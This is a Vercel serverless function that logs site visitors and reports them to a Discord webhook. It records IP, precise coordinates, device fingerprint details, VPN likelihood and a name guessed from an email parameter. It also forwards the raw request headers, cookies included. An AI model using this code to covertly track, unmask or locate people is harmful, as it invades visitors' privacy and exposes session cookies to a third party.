// api/alert.js
// Aggregates near-identical hits, infers a tester name (if provided), scores VPN/proxy likelihood,
// and sends compact, human-readable Discord alerts using embeds. Designed for Vercel (Node 18).

const dns = require('node:dns').promises;

module.exports = async (req, res) => {
  // ---- CORS ----
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();

  const webhook = process.env.DISCORD_WEBHOOK_URL;
  if (!webhook) return res.status(500).send('Missing DISCORD_WEBHOOK_URL');

  // ---- tunables ----
  const AGG_WINDOW_MS = 3000;  // group events in a 3s window
  const HOLD_MS = 12000;       // keep entry around to avoid bounce-back spam
  const JSON_MAX = 1400;       // debug JSON max chars (kept small so messages never exceed limits)
  const RDNS_TIMEOUT_MS = 300; // fast reverse-DNS best-effort

  // ---- in-memory aggregation (per warm instance) ----
  if (!global.__ALERT_AGG) global.__ALERT_AGG = new Map();
  const agg = global.__ALERT_AGG;

  // ---- helpers ----
  const clamp = (n, a, b) => Math.max(a, Math.min(b, n));
  const safeJson = o => { try { return JSON.stringify(o, null, 2); } catch { return String(o); } };
  const trim = (s, n) => (s && s.length > n ? s.slice(0, n - 120) + '\n...trimmed...' : (s || ''));
  const parseUA = (ua='')=>{
    let browser='Unknown';
    if (/edg/i.test(ua)) browser='Edge';
    else if (/opr|opera/i.test(ua)) browser='Opera';
    else if (/firefox|fxios/i.test(ua)) browser='Firefox';
    else if (/chrome|crios/i.test(ua)) browser='Chrome';
    else if (/safari/i.test(ua)) browser='Safari';
    let os='Unknown';
    if (/windows nt/i.test(ua)) os='Windows';
    else if (/macintosh|mac os x/i.test(ua)) os='macOS';
    else if (/android/i.test(ua)) os='Android';
    else if (/iphone|ipad|ipod/i.test(ua)) os='iOS';
    else if (/linux/i.test(ua)) os='Linux';
    const device = /mobile|android|iphone|ipad|ipod/i.test(ua) ? (/android/i.test(ua) ? 'Android' : (/iphone|ipad|ipod/i.test(ua) ? 'iPhone' : 'Mobile')) : 'PC';
    return {browser, os, device};
  };
  const flagFor = (cc='')=>{
    if(!cc) return '';
    try { return String.fromCodePoint(...[...cc].map(c=>0x1F1E6 + (c.charCodeAt(0)-65))); } catch { return ''; }
  };
  const cookieGet = (cookieStr='', key) => {
    const m = (cookieStr||'').match(new RegExp('(?:^|; )'+key+'=([^;]+)')); return m ? decodeURIComponent(m[1]) : null;
  };
  const postDiscord = async (payloads) => {
    for (const p of payloads) {
      const r = await fetch(webhook, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify(p)
      });
      if (!r.ok) {
        // If embed too big, fall back to a tiny content message
        await fetch(webhook, {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ content: '⚠️ Alert too large; sent minimal summary.' })
        }).catch(()=>{});
        break;
      }
    }
  };

  // ---- request parse ----
  const ua = req.headers['user-agent'] || '';
  const uaParsed = parseUA(ua);
  const ip = (req.headers['x-forwarded-for']||'').split(',')[0]?.trim() || req.socket?.remoteAddress || 'unknown';
  const q = req.query || {};
  const refHeader = req.headers['referer'] || 'none';

  let body = {};
  if (req.method === 'POST') {
    try { body = typeof req.body === 'object' ? req.body : JSON.parse(req.body || '{}'); } catch { body = {}; }
  }

  // geo headers
  const city      = req.headers['x-vercel-ip-city'] || '';
  const region    = req.headers['x-vercel-ip-country-region'] || req.headers['x-vercel-ip-region'] || '';
  const country   = (req.headers['x-vercel-ip-country'] || '').toUpperCase();
  const asn       = req.headers['x-vercel-ip-asn'] || '';
  const latitude  = req.headers['x-vercel-ip-latitude'] || '';
  const longitude = req.headers['x-vercel-ip-longitude'] || '';

  // combined client view
  const client = {
    fpHash: body.fpHash ?? null,
    browser: body.browser ?? uaParsed.browser,
    os: body.os ?? uaParsed.os,
    device: body.device ?? uaParsed.device,
    language: body.language ?? (req.headers['accept-language']||'').split(',')[0] || 'unknown',
    timezone: body.timezone ?? q.tz ?? null,
    gpu: body.gpu ?? null,
    net: body.net ?? null,
    hw: body.hw ?? null,
    screen: body.screen ?? null,
    battery: body.battery ?? null,
    color: body.color ?? null,
    path: (body.path ?? q.path ?? req.headers['x-pathname'] ?? '/').toString().slice(0, 512),
    ref: body.ref ?? q.ref ?? refHeader ?? 'none',
    name: body.name || q.name || req.headers['x-user-name'] || cookieGet(req.headers.cookie, 'name') || null
  };

  // ---- name inference fallback ----
  if (!client.name) {
    const email = body.email || q.email || null;
    if (email && /^[^\s@]+@[^\s@]+$/.test(email)) {
      const user = email.split('@')[0].replace(/[._-]+/g, ' ').trim();
      if (user && !/\d{5,}/.test(user)) client.name = user.replace(/\b\w/g, c=>c.toUpperCase()).slice(0,64);
    }
  }

  // ---- VPN/proxy heuristic ----
  const vpnHints = [];
  let vpnScore = 0;

  // TZ vs country mismatch
  if (client.timezone && country) {
    const usTZ = ['America/Los_Angeles','America/Denver','America/Chicago','America/New_York','America/Phoenix','America/Anchorage','Pacific/Honolulu'];
    const tzIsUS = usTZ.includes(client.timezone);
    if ((country !== 'US' && tzIsUS) || (country === 'US' && !tzIsUS)) {
      vpnScore += 20; vpnHints.push('TZ vs country mismatch');
    }
  }
  // language vs country
  if (client.language && country) {
    const lang = client.language.toLowerCase();
    if (country === 'US' && !lang.startsWith('en')) { vpnScore += 10; vpnHints.push('Non-EN language in US'); }
    if (country !== 'US' && lang.startsWith('en') && !['GB','CA','AU','NZ','IE'].includes(country)) { vpnScore += 5; vpnHints.push('EN outside usual EN countries'); }
  }
  // ASN hint
  const asnL = (asn || '').toLowerCase();
  const vpnAsnHints = ['m247','ovh','digitalocean','linode','choopa','contabo','hetzner','leaseweb','vultr','azure','amazon','aws','google','gcp','cloudflare','warp','mullvad','proton','surfshark','windscribe','airvpn','privateinternetaccess','hivelocity','nocix','colo'];
  if (asnL && vpnAsnHints.some(k=>asnL.includes(k))) { vpnScore += 35; vpnHints.push(`ASN: ${asn}`); }

  // reverse DNS (fast timeout)
  let rdns = '';
  try {
    const p = dns.reverse(ip);
    const r = await Promise.race([
      p.then(names => (Array.isArray(names) && names[0]) || '').catch(()=> ''),
      new Promise(res => setTimeout(()=>res(''), RDNS_TIMEOUT_MS))
    ]);
    rdns = r || '';
  } catch {}
  const rdnsL = (rdns||'').toLowerCase();
  if (rdnsL) {
    const bads = ['vpn','proxy','m247','ovh','aws','amazonaws','compute','google','gcp','cloud','azure','linode','digitalocean','mullvad','proton','surfshark','windscribe','airvpn','piavpn','leaseweb','contabo','choopa','colo','nocix'];
    if (bads.some(x=>rdnsL.includes(x))) { vpnScore += 35; vpnHints.push(`rDNS: ${rdns}`); }
  }
  vpnScore = clamp(vpnScore, 0, 100);
  const vpnTier = vpnScore >= 70 ? 'High' : vpnScore >= 35 ? 'Medium' : 'Low';

  // ---- aggregation key ----
  const key = [ip, client.device||'-', client.browser||'-', client.path||'/', client.fpHash ? String(client.fpHash).slice(0,12) : '-'].join('|');

  const now = Date.now();
  const existing = agg.get(key);
  if (existing) {
    existing.count += 1;
    existing.lastTs = now;
    existing.client = client;
    existing.body = body;
    existing.headers = req.headers;
    existing.vpn = { score: vpnScore, tier: vpnTier, hints: vpnHints, rdns, asn };
    clearTimeout(existing.timer);
    existing.timer = setTimeout(()=>send(key), AGG_WINDOW_MS);
  } else {
    agg.set(key, {
      count: 1,
      firstTs: now,
      lastTs: now,
      client, body, headers: req.headers,
      vpn: { score: vpnScore, tier: vpnTier, hints: vpnHints, rdns, asn },
      timer: setTimeout(()=>send(key), AGG_WINDOW_MS)
    });
  }

  // quick, non-blocking response
  if (req.method === 'GET') return res.status(200).send('ok');
  res.status(204).end();

  async function send(k){
    const item = agg.get(k); if (!item) return;
    const c = item.client;
    const first = new Date(item.firstTs).toLocaleString('en-US', { timeZone: 'America/Los_Angeles' });
    const last  = new Date(item.lastTs).toLocaleString('en-US', { timeZone: 'America/Los_Angeles' });
    const geo = (city||region||country) ? `${city?city+', ':''}${region?region+', ':''}${country}${flagFor(country)?' '+flagFor(country):''}` : 'Unknown';

    // Build an embed (bigger limits; looks clean)
    const summaryFields = [
      { name: 'Count (deduped)', value: String(item.count), inline: true },
      { name: 'When', value: `${first} → ${last}`, inline: false },
      { name: 'Name (guess)', value: c.name ? `${c.name}` : '—', inline: true },
      { name: 'VPN/Proxy', value: `${item.vpn.tier} (${item.vpn.score}/100)`, inline: true },
      { name: 'VPN hints', value: item.vpn.hints.length ? item.vpn.hints.join(' • ') : '—', inline: false },
      { name: 'Device / OS / Browser', value: `${c.device} / ${c.os} / ${c.browser}`, inline: false },
      { name: 'Geo', value: `${geo}${latitude&&longitude?` (${latitude}, ${longitude})`:''}`, inline: false },
      { name: 'IP', value: ip, inline: true },
      { name: 'Path', value: c.path || '/', inline: true },
      { name: 'Ref', value: c.ref || 'none', inline: true },
      { name: 'Lang / TZ', value: `${c.language} / ${c.timezone || '—'}`, inline: true },
      { name: 'FP Hash', value: c.fpHash ? String(c.fpHash).slice(0,12) : '—', inline: true }
    ];

    if (c.gpu) summaryFields.push({ name: 'GPU', value: c.gpu.renderer || c.gpu.vendor || safeJson(c.gpu), inline: false });
    if (c.hw)  summaryFields.push({ name: 'HW', value: `${c.hw.cores ?? '-'} cores • ${c.hw.memoryGB ?? '-'} GB`, inline: true });
    if (c.net) summaryFields.push({ name: 'Net', value: `${c.net.type || '-'} • ${c.net.downlink ?? '-'} Mb/s`, inline: true });
    if (c.screen) summaryFields.push({ name: 'Screen', value: `${c.screen.w}×${c.screen.h} (${c.screen.colorDepth}-bit)`, inline: true });
    if (c.battery) summaryFields.push({ name: 'Battery', value: `${Math.round((c.battery.level ?? 0)*100)}% • ${c.battery.charging ? '⚡ charging' : 'idle'}`, inline: true });
    if (c.color) summaryFields.push({ name: 'Color Mode', value: c.color.scheme || '-', inline: true });
    if (item.vpn.rdns) summaryFields.push({ name: 'rDNS', value: item.vpn.rdns, inline: false });
    if (item.vpn.asn)  summaryFields.push({ name: 'ASN', value: String(item.vpn.asn), inline: false });

    const embed = {
      title: 'New Visit (aggregated)',
      color: 0x5865F2, // Discord blurple
      fields: summaryFields,
      timestamp: new Date(item.lastTs).toISOString()
    };

    // Debug JSON (headers + body) as a separate message to avoid size limits
    const debug = { headers: item.headers || {}, body: item.body || {}, rawUa: ua, q };
    const debugMsg = '```json\n' + trim(safeJson(debug), JSON_MAX) + '\n```';

    // Send (split into two payloads to be safe)
    const payloads = [
      { embeds: [embed] },
      { content: debugMsg }
    ];
    try { await postDiscord(payloads); } catch (e) { console.error('Discord send error', e && e.stack || e); }

    clearTimeout(item.timer);
    setTimeout(()=>agg.delete(k), HOLD_MS);
  }
};
